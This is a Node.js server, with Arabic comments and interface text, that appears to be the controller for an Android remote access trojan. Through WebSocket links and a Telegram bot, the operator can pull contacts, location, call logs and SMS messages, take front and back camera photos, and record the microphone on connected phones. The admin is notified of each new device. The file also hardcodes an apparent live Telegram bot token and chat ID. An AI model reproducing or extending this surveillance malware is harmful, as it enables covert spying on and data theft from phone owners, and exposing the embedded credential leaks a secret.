const express = require('express');
const WebSocket = require('ws');
const http = require('http');
const TelegramBot = require('node-telegram-bot-api');
const { v4: uuidv4 } = require('uuid');
const multer = require('multer');
const bodyParser = require('body-parser');
const axios = require('axios');
const moment = require('moment');
const helmet = require('helmet');
const cors = require('cors');
const rateLimit = require('express-rate-limit');

// ==================== الإعدادات الرئيسية ====================
const CONFIG = {
  bot: {
    // 🔴 ضع التوكن والآيدي هنا
    token: process.env.BOT_TOKEN || '8275181418:AAHRGLNjc6JxI2wiboqDJFpw3HEvCugn4fA',
    adminId: process.env.ADMIN_CHAT_ID || '7604667042',
    pollInterval: 3000
  },
  server: {
    port: process.env.PORT || 3000,
    host: '0.0.0.0'
  },
  security: {
    allowedFileTypes: ['image/', 'video/', 'audio/', 'text/', 'application/pdf'],
    maxFileSize: 10 * 1024 * 1024,
    sessionTimeout: 30 * 60 * 1000
  }
};

// ==================== التحقق من الإعدادات ====================
function validateConfig() {
  if (CONFIG.bot.token.includes('ضع_التوكن')) {
    console.error('❌ خطأ: لم تضف توكن البوت!');
    console.log('📝 اذهب إلى @BotFather في تيليجرام واحصل على التوكن');
    process.exit(1);
  }
  
  if (CONFIG.bot.adminId.includes('ضع_الآيدي')) {
    console.error('❌ خطأ: لم تضف آيدي الدردشة!');
    console.log('📝 اذهب إلى @userinfobot في تيليجرام واحصل على الآيدي');
    process.exit(1);
  }
  
  console.log('✅ الإعدادات صحيحة - جاري تشغيل النظام...');
}

// ==================== تهيئة التطبيق ====================
const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

// إعدادات الأمان
app.use(helmet());
app.use(cors());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// معدل الاستخدام للحماية
const limiter = rateLimit({
  windowMs: 1 * 60 * 1000,
  max: 10,
  message: '❌ عدد الطلبات كبير جداً، الرجاء المحاولة لاحقاً'
});
app.use(limiter);

// إعدادات رفع الملفات
const upload = multer({
  limits: {
    fileSize: CONFIG.security.maxFileSize
  },
  fileFilter: (req, file, cb) => {
    if (CONFIG.security.allowedFileTypes.some(type => file.mimetype.startsWith(type))) {
      cb(null, true);
    } else {
      cb(new Error('نوع الملف غير مسموح به'), false);
    }
  }
});

// ==================== إعداد البوت ====================
console.log('🔧 جاري تهيئة بوت التليجرام...');
const bot = new TelegramBot(CONFIG.bot.token, { 
  polling: true,
  request: {
    timeout: 60000
  }
});

// التحقق من اتصال البوت
bot.getMe().then(botInfo => {
  console.log(`✅ البوت يعمل: @${botInfo.username}`);
}).catch(error => {
  console.error('❌ خطأ في البوت:', error.message);
  process.exit(1);
});

// ==================== إدارة الأجهزة ====================
const connectedDevices = new Map();
const deviceSessions = new Map();

class DeviceManager {
  static addDevice(ws, deviceInfo) {
    const deviceId = uuidv4();
    const deviceData = {
      id: deviceId,
      ws: ws,
      info: deviceInfo,
      connectedAt: new Date(),
      lastActivity: new Date(),
      status: 'online'
    };

    connectedDevices.set(deviceId, deviceData);
    ws.deviceId = deviceId;

    console.log(`📱 جهاز متصل: ${deviceInfo.model} (${deviceId})`);
    return deviceId;
  }

  static removeDevice(deviceId) {
    const device = connectedDevices.get(deviceId);
    if (device) {
      connectedDevices.delete(deviceId);
      console.log(`📴 جهاز منفصل: ${device.info.model} (${deviceId})`);
    }
  }

  static getDevice(deviceId) {
    return connectedDevices.get(deviceId);
  }

  static getAllDevices() {
    return Array.from(connectedDevices.values());
  }

  static updateActivity(deviceId) {
    const device = connectedDevices.get(deviceId);
    if (device) {
      device.lastActivity = new Date();
    }
  }

  // 🔄 وظائف متوافقة مع APK القديم
  static sendToDeviceOldProtocol(deviceId, command, data = '') {
    const device = connectedDevices.get(deviceId);
    if (device && device.ws.readyState === WebSocket.OPEN) {
      // ⚠️ البروتوكول القديم - يرسل نص عادي بدون JSON
      let message = '';
      
      switch(command) {
        case 'show_message':
          message = `send_message:${data}`;
          break;
        case 'vibrate':
          message = 'vibrate:';
          break;
        case 'play_sound':
          message = `play_audio:${data}`;
          break;
        case 'show_notification':
          message = `toast:${data}`;
          break;
        case 'open_url':
          message = `show_notification:${data}`;
          break;
        case 'get_contacts':
          message = 'contacts:';
          break;
        case 'get_location':
          message = 'location:';
          break;
        case 'take_picture':
          message = 'camera_main:';
          break;
        case 'take_selfie':
          message = 'camera_selfie:';
          break;
        case 'record_audio':
          message = `microphone:${data}`;
          break;
        case 'get_apps':
          message = 'apps:';
          break;
        case 'get_call_logs':
          message = 'calls:';
          break;
        case 'get_messages':
          message = 'messages:';
          break;
        default:
          message = command + ':' + data;
      }
      
      device.ws.send(message);
      this.updateActivity(deviceId);
      return true;
    }
    return false;
  }

  // 🔄 دعم البروتوكول الجديد والقديم
  static sendToDevice(deviceId, command, data = {}) {
    // حاول البروتوكول الجديد أولاً
    const device = connectedDevices.get(deviceId);
    if (device && device.ws.readyState === WebSocket.OPEN) {
      try {
        // البروتوكول الجديد (JSON)
        const message = {
          type: 'command',
          command: command,
          data: data,
          timestamp: new Date().toISOString()
        };
        
        device.ws.send(JSON.stringify(message));
        this.updateActivity(deviceId);
        return true;
      } catch (error) {
        // إذا فشل، جرب البروتوكول القديم
        console.log('🔄 استخدام البروتوكول القديم للأمر:', command);
        return this.sendToDeviceOldProtocol(deviceId, command, 
          typeof data === 'string' ? data : JSON.stringify(data));
      }
    }
    return false;
  }

  static broadcast(command, data = {}) {
    let successCount = 0;
    connectedDevices.forEach((device, deviceId) => {
      if (this.sendToDevice(deviceId, command, data)) {
        successCount++;
      }
    });
    return successCount;
  }
}

// ==================== إدارة البوت ====================
class BotManager {
  static sendMainMenu(chatId) {
    const welcomeMessage = `
🎯 *مرحباً بك في نظام التحكم المتقدم*

📊 **الإحصائيات الحالية:**
• 📱 الأجهزة المتصلة: ${connectedDevices.size}
• ⏰ وقت التشغيل: ${moment().format('YYYY-MM-DD HH:mm:ss')}
• 🔄 الإصدار: متوافق مع APK الحالي

🛠 **اختر من الأوامر التالية:**
    `;

    bot.sendMessage(chatId, welcomeMessage, {
      parse_mode: 'Markdown',
      reply_markup: mainKeyboard.reply_markup
    });
  }

  static async sendDeviceList(chatId) {
    const devices = DeviceManager.getAllDevices();
    
    if (devices.length === 0) {
      bot.sendMessage(chatId, '❌ لا توجد أجهزة متصلة حالياً', mainKeyboard);
      return;
    }

    let message = `📱 *قائمة الأجهزة المتصلة (${devices.length})*:\n\n`;
    
    devices.forEach((device, index) => {
      const uptime = moment(device.connectedAt).fromNow();
      const lastSeen = moment(device.lastActivity).fromNow();
      
      message += `*${index + 1}. ${device.info.model}*\n`;
      message += `   🆔: \`${device.id}\`\n`;
      message += `   🔋 البطارية: ${device.info.battery || 'غير معروف'}%\n`;
      message += `   📶 الإصدار: ${device.info.version || 'غير معروف'}\n`;
      message += `   ⏰ متصل منذ: ${uptime}\n`;
      message += `   🔄 آخر نشاط: ${lastSeen}\n\n`;
    });

    const inlineKeyboard = devices.map(device => [
      {
        text: `⚙️ ${device.info.model}`,
        callback_data: `device_${device.id}`
      }
    ]);

    bot.sendMessage(chatId, message, {
      parse_mode: 'Markdown',
      reply_markup: {
        inline_keyboard: inlineKeyboard
      }
    });
  }

  static sendDeviceDetails(chatId, deviceId) {
    const device = DeviceManager.getDevice(deviceId);
    if (!device) {
      bot.sendMessage(chatId, '❌ الجهاز غير متوفر', mainKeyboard);
      return;
    }

    const message = `
🔍 *معلومات الجهاز التفصيلية*

📱 *النموذج:* ${device.info.model}
🆔 *المعرف:* \`${device.id}\`
🔋 *البطارية:* ${device.info.battery}%
📶 *إصدار الأندرويد:* ${device.info.version}
💡 *سطوع الشاشة:* ${device.info.brightness}%
📡 *مزود الخدمة:* ${device.info.provider}
⏰ *وقت الاتصال:* ${moment(device.connectedAt).format('YYYY-MM-DD HH:mm:ss')}
🔄 *آخر نشاط:* ${moment(device.lastActivity).fromNow()}
🟢 *الحالة:* ${device.status}
🔧 *البروتوكول:* متوافق مع APK الحالي
    `;

    const controlKeyboard = {
      inline_keyboard: [
        [
          { text: '📨 إرسال رسالة', callback_data: `send_msg_${deviceId}` },
          { text: '📍 إرسال موقع', callback_data: `send_loc_${deviceId}` }
        ],
        [
          { text: '📁 إرسال ملف', callback_data: `send_file_${deviceId}` },
          { text: '🔔 إشعار', callback_data: `notify_${deviceId}` }
        ],
        [
          { text: '📷 كاميرا أمامية', callback_data: `camera_front_${deviceId}` },
          { text: '📸 كاميرا خلفية', callback_data: `camera_back_${deviceId}` }
        ],
        [
          { text: '🎤 تسجيل صوت', callback_data: `record_audio_${deviceId}` },
          { text: '🔊 تشغيل صوت', callback_data: `play_audio_${deviceId}` }
        ],
        [
          { text: '📊 معلومات النظام', callback_data: `sys_info_${deviceId}` },
          { text: '🔄 تحديث المعلومات', callback_data: `refresh_${deviceId}` }
        ],
        [
          { text: '🏠 القائمة الرئيسية', callback_data: 'main_menu' }
        ]
      ]
    };

    bot.sendMessage(chatId, message, {
      parse_mode: 'Markdown',
      reply_markup: controlKeyboard
    });
  }
}

// ==================== لوحات المفاتيح ====================
const mainKeyboard = {
  reply_markup: {
    keyboard: [
      ['📱 قائمة الأجهزة', '🔍 معلومات الجهاز'],
      ['📨 إرسال رسالة', '📍 إرسال موقع'],
      ['📁 إرسال ملف', '🎤 تسجيل ميكروفون'],
      ['📷 كاميرا أمامية', '📸 كاميرا خلفية'],
      ['🔔 إشعار', '🔊 تشغيل صوت'],
      ['⚙️ الإعدادات', '📊 الإحصائيات']
    ],
    resize_keyboard: true
  }
};

// ==================== مسارات الويب ====================
app.get('/', (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html>
    <head>
        <title>نظام التحكم في الأجهزة - الإصدار المتوافق</title>
        <meta charset="utf-8">
        <style>
            body { 
                font-family: Arial, sans-serif; 
                margin: 40px; 
                direction: rtl; 
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                color: white;
            }
            .container {
                max-width: 800px;
                margin: 0 auto;
                background: rgba(255,255,255,0.1);
                padding: 30px;
                border-radius: 15px;
                backdrop-filter: blur(10px);
            }
            .stats { 
                background: rgba(255,255,255,0.2); 
                padding: 20px; 
                border-radius: 10px; 
                margin-bottom: 20px;
            }
            .device { 
                border: 1px solid rgba(255,255,255,0.3); 
                padding: 15px; 
                margin: 10px 0; 
                border-radius: 5px; 
                background: rgba(255,255,255,0.1);
            }
            .compatibility {
                background: green;
                padding: 10px;
                border-radius: 5px;
                text-align: center;
                margin: 10px 0;
            }
            h1 { text-align: center; margin-bottom: 30px; }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>🎯 نظام التحكم في الأجهزة - الإصدار المتوافق</h1>
            <div class="compatibility">
                ✅ متوافق مع APK الحالي
            </div>
            <div class="stats">
                <h3>📊 الإحصائيات:</h3>
                <p>📱 الأجهزة المتصلة: <strong>${connectedDevices.size}</strong></p>
                <p>⏰ وقت الخادم: <strong>${new Date().toLocaleString('ar-SA')}</strong></p>
                <p>🚀 حالة النظام: <strong>🟢 يعمل مع APK الحالي</strong></p>
            </div>
            <div class="devices">
                <h3>📲 الأجهزة المتصلة:</h3>
                ${DeviceManager.getAllDevices().map(device => `
                    <div class="device">
                        <strong>${device.info.model}</strong><br>
                        🔋 ${device.info.battery}% | 📶 ${device.info.version}<br>
                        ⏰ ${moment(device.connectedAt).fromNow()}
                    </div>
                `).join('') || '<p>لا توجد أجهزة متصلة</p>'}
            </div>
        </div>
    </body>
    </html>
  `);
});

// ==================== مسارات API متوافقة مع القديم ====================
app.post('/uploadFile', upload.single('file'), (req, res) => {
  try {
    if (!req.file) {
      return res.status(400).json({ error: 'لم يتم اختيار ملف' });
    }

    const deviceId = req.body.deviceId || Array.from(connectedDevices.keys())[0];
    if (deviceId) {
      DeviceManager.sendToDeviceOldProtocol(deviceId, 'receive_file', req.file.originalname);
    }

    res.json({ success: true, message: 'تم رفع الملف بنجاح' });
  } catch (error) {
    res.status(500).json({ error: 'خطأ في رفع الملف' });
  }
});

app.post('/uploadText', upload.none(), (req, res) => {
  try {
    const { deviceId, message } = req.body;
    
    if (!message) {
      return res.status(400).json({ error: 'الرسالة مطلوبة' });
    }

    const targetDeviceId = deviceId || Array.from(connectedDevices.keys())[0];
    if (targetDeviceId) {
      DeviceManager.sendToDeviceOldProtocol(targetDeviceId, 'show_message', message);
      res.json({ success: true, message: 'تم إرسال الرسالة بنجاح' });
    } else {
      res.status(404).json({ error: 'لا توجد أجهزة متصلة' });
    }
  } catch (error) {
    res.status(500).json({ error: 'خطأ في الخادم' });
  }
});

app.post('/uploadLocation', upload.none(), (req, res) => {
  try {
    const { deviceId, lat, lon } = req.body;
    
    if (!lat || !lon) {
      return res.status(400).json({ error: 'الإحداثيات مطلوبة' });
    }

    const targetDeviceId = deviceId || Array.from(connectedDevices.keys())[0];
    if (targetDeviceId) {
      DeviceManager.sendToDeviceOldProtocol(targetDeviceId, 'show_location', `${lat},${lon}`);
      res.json({ success: true, message: 'تم إرسال الموقع بنجاح' });
    } else {
      res.status(404).json({ error: 'لا توجد أجهزة متصلة' });
    }
  } catch (error) {
    res.status(500).json({ error: 'خطأ في الخادم' });
  }
});

// ==================== WebSocket Handling متوافق مع APK ====================
wss.on('connection', (ws, req) => {
  console.log('🔌 محاولة اتصال جديدة من جهاز APK...');

  let deviceId = null;

  ws.on('message', (data) => {
    try {
      // ⚠️ محاولة فهم بروتوكول APK القديم
      let messageData;
      
      try {
        // المحاولة الأولى: JSON (البروتوكول الجديد)
        messageData = JSON.parse(data);
      } catch (e) {
        // المحاولة الثانية: نص عادي (البروتوكول القديم)
        console.log('📨 رسالة نصية من APK:', data.toString());
        
        // محاولة تحليل البيانات القديمة
        if (data.toString().includes('model') || data.toString().includes('battery')) {
          try {
            // توقع تنسيق البيانات القديم
            const lines = data.toString().split('\n');
            const deviceInfo = {};
            
            lines.forEach(line => {
              const [key, value] = line.split(':');
              if (key && value) {
                deviceInfo[key.trim()] = value.trim();
              }
            });
            
            if (deviceInfo.model) {
              deviceId = DeviceManager.addDevice(ws, deviceInfo);
              
              ws.send('connected:' + deviceId);
              
              if (CONFIG.bot.adminId) {
                bot.sendMessage(CONFIG.bot.adminId, 
                  `🟢 *جهاز APK متصل*\n\n` +
                  `📱 *النموذج:* ${deviceInfo.model}\n` +
                  `🔋 *البطارية:* ${deviceInfo.battery}%\n` +
                  `📶 *الإصدار:* ${deviceInfo.version}\n` +
                  `🆔 *المعرف:* \`${deviceId}\``,
                  { parse_mode: 'Markdown' }
                );
              }
            }
          } catch (parseError) {
            console.log('❌ لا يمكن تحليل بيانات APK:', data.toString());
          }
        }
        return;
      }

      // معالجة بيانات JSON (البروتوكول الجديد)
      if (messageData.type === 'device_info') {
        deviceId = DeviceManager.addDevice(ws, messageData.data);
        
        ws.send(JSON.stringify({
          type: 'connection_established',
          deviceId: deviceId,
          timestamp: new Date().toISOString()
        }));

        if (CONFIG.bot.adminId) {
          bot.sendMessage(CONFIG.bot.adminId, 
            `🟢 *جهاز جديد متصل*\n\n` +
            `📱 *النموذج:* ${messageData.data.model}\n` +
            `🔋 *البطارية:* ${messageData.data.battery}%\n` +
            `📶 *الإصدار:* ${messageData.data.version}\n` +
            `🆔 *المعرف:* \`${deviceId}\``,
            { parse_mode: 'Markdown' }
          );
        }
      }
      else if (messageData.type === 'response') {
        console.log('📨 رد من الجهاز:', messageData);
      }

      if (deviceId) {
        DeviceManager.updateActivity(deviceId);
      }
    } catch (error) {
      console.error('❌ خطأ في معالجة رسالة APK:', error);
    }
  });

  ws.on('close', () => {
    if (deviceId) {
      DeviceManager.removeDevice(deviceId);
    }
  });

  ws.on('error', (error) => {
    console.error('❌ خطأ في WebSocket APK:', error);
    if (deviceId) {
      DeviceManager.removeDevice(deviceId);
    }
  });
});

// ==================== باقي الكود (معالجة البوت) ====================
// [يتبع نفس كود معالجة البوت من الإصدار السابق...]

bot.on('message', (msg) => {
  const chatId = msg.chat.id;
  const text = msg.text;

  if (CONFIG.bot.adminId && chatId != CONFIG.bot.adminId) {
    bot.sendMessage(chatId, '❌ غير مصرح لك باستخدام هذا البوت');
    return;
  }

  try {
    switch(text) {
      case '/start':
      case '🏠 القائمة الرئيسية':
        BotManager.sendMainMenu(chatId);
        break;

      case '📱 قائمة الأجهزة':
        BotManager.sendDeviceList(chatId);
        break;

      case '📨 إرسال رسالة':
        bot.sendMessage(chatId, '📝 الرجاء إدخال الرسالة التي تريد إرسالها:', {
          reply_markup: { force_reply: true }
        });
        break;

      default:
        if (msg.reply_to_message) {
          handleReplies(chatId, msg);
        } else {
          bot.sendMessage(chatId, '❌ أمر غير معروف، الرجاء استخدام القائمة', mainKeyboard);
        }
    }
  } catch (error) {
    console.error('❌ خطأ في معالجة الرسالة:', error);
    bot.sendMessage(chatId, '❌ حدث خطأ، الرجاء المحاولة لاحقاً');
  }
});

function handleReplies(chatId, msg) {
  const replyText = msg.reply_to_message.text;
  
  if (replyText.includes('الرسالة')) {
    const successCount = DeviceManager.broadcast('show_message', msg.text);
    bot.sendMessage(chatId, `✅ تم إرسال الرسالة إلى ${successCount} جهاز`, mainKeyboard);
  }
}

bot.on('callback_query', (callbackQuery) => {
  const message = callbackQuery.message;
  const data = callbackQuery.data;
  const chatId = message.chat.id;

  try {
    if (data.startsWith('device_')) {
      const deviceId = data.replace('device_', '');
      BotManager.sendDeviceDetails(chatId, deviceId);
    }
    else if (data.startsWith('send_msg_')) {
      const deviceId = data.replace('send_msg_', '');
      bot.sendMessage(chatId, '📝 اكتب الرسالة التي تريد إرسالها لهذا الجهاز:', {
        reply_markup: { force_reply: true }
      });
      deviceSessions.set(chatId, { action: 'send_message', deviceId: deviceId });
    }
    else if (data === 'main_menu') {
      BotManager.sendMainMenu(chatId);
    }

    bot.answerCallbackQuery(callbackQuery.id);
  } catch (error) {
    console.error('❌ خطأ في معالجة الزر:', error);
    bot.answerCallbackQuery(callbackQuery.id, { text: '❌ حدث خطأ' });
  }
});

// ==================== بدء التشغيل ====================
validateConfig();

const PORT = CONFIG.server.port;
server.listen(PORT, () => {
  console.log(`
🎯 نظام التحكم في الأجهزة يعمل بنجاح!
📍 PORT: ${PORT}
🤖 البوت: جاهز للإستقبال
🔄 الحالة: متوافق مع APK الحالي
⏰ الوقت: ${new Date().toLocaleString()}
📱 انتظر اتصال الأجهزة...
🔗 رابط الويب: http://localhost:${PORT}
  `);
});

process.on('uncaughtException', (error) => {
  console.error('❌ خطأ غير متوقع:', error);
});

process.on('unhandledRejection', (reason, promise) => {
  console.error('❌ رفض وعد غير معالج:', reason);
});
